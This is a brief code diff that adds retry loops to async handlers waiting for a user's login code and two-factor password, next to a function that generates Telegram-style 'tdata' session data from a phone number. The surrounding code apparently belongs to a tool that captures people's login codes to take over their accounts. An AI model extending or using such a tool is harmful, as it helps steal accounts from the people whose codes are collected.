@@ -282,6 +282,7 @@ async def wait_for_code(user_id):
                     )
                 else:
                     await redis_set(f"code_result:{user_id}", "wrong_code")
+                    asyncio.create_task(wait_for_code(user_id))
             return
     print(f"Timeout waiting for code from {user_id}")
 
@@ -313,6 +314,7 @@ async def wait_for_2fa(user_id):
             except Exception as e:
                 print(f"2FA error: {e}")
                 await redis_set(f"2fa_result:{user_id}", "wrong_password")
+                asyncio.create_task(wait_for_2fa(user_id))
             return
 
 async def generate_tdata(user_id, phone):
